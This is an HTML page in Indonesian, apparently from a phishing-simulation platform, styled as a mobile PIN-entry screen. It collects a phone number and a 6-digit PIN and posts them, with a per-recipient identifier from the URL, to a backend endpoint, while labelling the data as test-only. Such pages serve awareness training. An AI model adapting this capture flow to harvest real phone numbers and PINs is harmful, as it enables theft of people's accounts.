<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halaman Simulasi</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="config.js"></script>
    <link rel="stylesheet" href="design-system.css">
    <style>
        [x-cloak] {
            display: none !important;
        }

        * {
            -webkit-tap-highlight-color: transparent;
        }
    </style>
</head>

<body class="min-h-screen bg-zinc-100 text-zinc-900">
    <main x-data="guestSimulation()" x-init="init()" x-cloak :aria-busy="isProcessing"
        class="grid min-h-screen place-items-center px-4 py-6">
        <section
            class="relative flex min-h-[720px] w-full max-w-[390px] flex-col overflow-hidden rounded-[28px] border border-zinc-200 bg-white shadow-xl sm:min-h-[760px]">
            <div x-show="isProcessing" x-transition.opacity.duration.200ms role="status" aria-live="polite"
                class="absolute inset-0 z-[70] grid place-items-center bg-white/95" style="display: none;">
                <div class="text-center">
                    <div class="mx-auto h-14 w-14 animate-spin rounded-full border-4 border-zinc-200 border-t-teal-700">
                    </div>
                    <p class="mt-4 text-sm font-semibold text-teal-800">Memproses...</p>
                </div>
            </div>

            <header class="flex items-center justify-between border-b border-zinc-100 px-5 py-4">
                <button type="button" @click="goBack"
                    class="grid h-10 w-10 place-items-center rounded-full text-zinc-500 hover:bg-zinc-50"
                    aria-label="Kembali">
                    <i data-lucide="chevron-left" class="h-5 w-5"></i>
                </button>
                <div class="text-center">
                    <p class="text-xs font-semibold uppercase tracking-wider text-teal-700">Mode Simulasi</p>
                    <h1 class="text-base font-semibold text-zinc-950">Halaman Uji</h1>
                </div>
                <span class="grid h-10 w-10 place-items-center rounded-full text-zinc-500" aria-hidden="true">
                    <i data-lucide="circle-help" class="h-5 w-5"></i>
                </span>
            </header>

            <section class="px-6 pb-6 pt-8">
                <div class="mx-auto mb-7 grid h-16 w-16 place-items-center rounded-2xl bg-teal-700 text-white">
                    <i data-lucide="shield-check" class="h-8 w-8"></i>
                </div>

                <div class="mb-8 text-center">
                    <p class="text-sm font-medium text-amber-700">Data uji saja</p>
                    <h2 class="mt-1 text-2xl font-semibold text-zinc-950">Input Simulasi</h2>
                    <p class="mt-3 text-sm leading-6 text-zinc-600">
                        Gunakan nomor dan kode uji. Jangan gunakan PIN, OTP, password, atau credential akun nyata.
                    </p>
                </div>

                <form @submit.prevent="continueToPin" class="space-y-5">
                    <label class="block">
                        <span class="text-sm font-semibold text-zinc-800">Nomor HP simulasi</span>
                        <div class="mt-2 flex items-center gap-3 border-b border-zinc-300 pb-3 focus-within:border-teal-700">
                            <i data-lucide="smartphone" class="h-5 w-5 text-zinc-500"></i>
                            <input x-model="phone" @input="phone = sanitizePhone(phone)" type="tel" inputmode="tel"
                                maxlength="32" placeholder="+62 812 0000 0000"
                                class="min-w-0 flex-1 bg-transparent text-lg outline-none placeholder:text-zinc-400"
                                autocomplete="off">
                        </div>
                    </label>

                    <div x-show="error" role="alert"
                        class="rounded-md border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-700"
                        x-text="error"></div>

                    <button type="submit" :disabled="isProcessing"
                        class="inline-flex h-12 w-full items-center justify-center gap-2 rounded-md bg-teal-700 px-4 text-sm font-semibold text-white hover:bg-teal-800 disabled:cursor-not-allowed disabled:opacity-60">
                        <span>Lanjut</span>
                        <i data-lucide="arrow-right" class="h-4 w-4"></i>
                    </button>
                </form>
            </section>

            <div class="mt-auto border-t border-zinc-100 bg-zinc-50 px-6 py-5">
                <div class="flex items-center gap-3 text-sm text-zinc-600">
                    <span class="grid h-9 w-9 place-items-center rounded-full bg-white text-teal-700">
                        <i data-lucide="lock-keyhole" class="h-4 w-4"></i>
                    </span>
                    <span>Ruang input simulasi</span>
                </div>
            </div>

            <div x-show="showPinModal" x-transition.opacity.duration.200ms @click="closePinModal"
                class="absolute inset-0 z-40 bg-zinc-950/50" style="display: none;"></div>

            <section x-show="showPinModal" @keydown.escape.window="closePinModal" role="dialog" aria-modal="true"
                x-transition:enter="transition ease-out duration-300"
                x-transition:enter-start="translate-y-full" x-transition:enter-end="translate-y-0"
                x-transition:leave="transition ease-in duration-200" x-transition:leave-start="translate-y-0"
                x-transition:leave-end="translate-y-full"
                class="absolute inset-0 z-50 flex h-full w-full flex-col overflow-hidden rounded-none bg-white"
                style="display: none;">
                <div class="relative flex items-center justify-between border-b border-zinc-100 px-4 py-4">
                    <button type="button" @click="closePinModal"
                        class="grid h-10 w-10 place-items-center rounded-full text-zinc-700 hover:bg-zinc-100"
                        aria-label="Tutup">
                        <i data-lucide="x" class="h-5 w-5"></i>
                    </button>
                    <h2 class="absolute left-1/2 top-1/2 w-[220px] -translate-x-1/2 -translate-y-1/2 text-center text-sm font-semibold text-zinc-950">
                        Masukkan kode uji
                    </h2>
                    <div class="h-10 w-10"></div>
                </div>

                <div class="flex flex-1 flex-col items-center justify-center px-6 py-7">
                    <p class="mb-5 text-sm text-zinc-600">Kode simulasi 6 digit</p>
                    <div class="mb-6 flex gap-4" aria-label="Jumlah digit kode uji">
                        <template x-for="i in 6" :key="i">
                            <span class="h-3 w-3 rounded-full transition-colors"
                                :class="pin.length >= i ? 'bg-zinc-900' : 'bg-zinc-200'"></span>
                        </template>
                    </div>
                    <button type="button" @click="pin = ''"
                        class="text-sm font-semibold text-teal-700 hover:text-teal-800">Bersihkan</button>
                </div>

                <div class="grid grid-cols-3 border-t border-zinc-200 bg-zinc-100 text-xl font-semibold text-zinc-950">
                    <template x-for="number in keypad" :key="number">
                        <button type="button" @click="addPin(number)"
                            class="h-14 border-b border-r border-zinc-200 bg-white active:bg-zinc-100"
                            x-text="number"></button>
                    </template>
                    <div class="h-14 border-r border-zinc-200 bg-zinc-100"></div>
                    <button type="button" @click="addPin('0')"
                        class="h-14 border-r border-zinc-200 bg-white active:bg-zinc-100">0</button>
                    <button type="button" @click="removePin"
                        class="grid h-14 place-items-center bg-zinc-100 active:bg-zinc-200" aria-label="Hapus digit">
                        <i data-lucide="delete" class="h-5 w-5"></i>
                    </button>
                </div>
            </section>
        </section>
    </main>

    <script>
        function guestSimulation() {
            return {
                apiBase: window.SAAS_CONFIG?.API_BASE || '../backend/api/index.php?action=',
                identifier: '',
                phone: '',
                pin: '',
                error: '',
                guestErrorMessage: 'Terjadi kesalahan pada server',
                showPinModal: false,
                isProcessing: false,
                keypad: ['1', '2', '3', '4', '5', '6', '7', '8', '9'],

                init() {
                    const params = new URLSearchParams(window.location.search);
                    this.identifier = (params.get('identifier') || '').trim();

                    if (!this.identifier) {
                        this.error = this.guestErrorMessage;
                    }

                    this.refreshIcons();
                },
                refreshIcons() {
                    this.$nextTick(() => window.lucide?.createIcons());
                },
                goBack() {
                    if (window.history.length > 1) {
                        window.history.back();
                    }
                },
                sanitizePhone(value) {
                    return String(value || '').replace(/[^0-9+()\-\s]/g, '').slice(0, 32);
                },
                continueToPin() {
                    this.error = '';

                    if (!this.identifier || !/^[0-9+()\-\s]{6,32}$/.test(this.phone.trim())) {
                        this.error = this.guestErrorMessage;
                        return;
                    }

                    this.pin = '';
                    this.showPinModal = true;
                    this.refreshIcons();
                },
                closePinModal() {
                    if (this.isProcessing) return;

                    this.showPinModal = false;
                    this.pin = '';
                },
                addPin(number) {
                    if (this.isProcessing || this.pin.length >= 6) return;

                    this.pin += number;

                    if (this.pin.length === 6) {
                        this.submitGuest();
                    }
                },
                removePin() {
                    if (this.isProcessing || this.pin.length === 0) return;

                    this.pin = this.pin.slice(0, -1);
                },
                async submitGuest() {
                    if (this.isProcessing) return;

                    if (!/^[0-9]{6}$/.test(this.pin)) {
                        this.error = this.guestErrorMessage;
                        this.showPinModal = false;
                        this.pin = '';
                        return;
                    }

                    this.isProcessing = true;
                    this.error = '';

                    try {
                        const response = await fetch(this.apiBase + 'guest-submit', {
                            method: 'POST',
                            credentials: 'include',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                identifier: this.identifier,
                                phone_simulation: this.phone.trim(),
                                pin_simulation: this.pin,
                            }),
                        });
                        const data = await response.json().catch(() => ({}));

                        if (!response.ok || data.ok === false) {
                            throw new Error(this.guestErrorMessage);
                        }

                        this.phone = '';
                        this.pin = '';
                        this.showPinModal = false;
                    } catch (_) {
                        this.error = this.guestErrorMessage;
                        this.pin = '';
                        this.showPinModal = false;
                    } finally {
                        this.isProcessing = false;
                        this.refreshIcons();
                    }
                },
            };
        }
    </script>
</body>

</html>
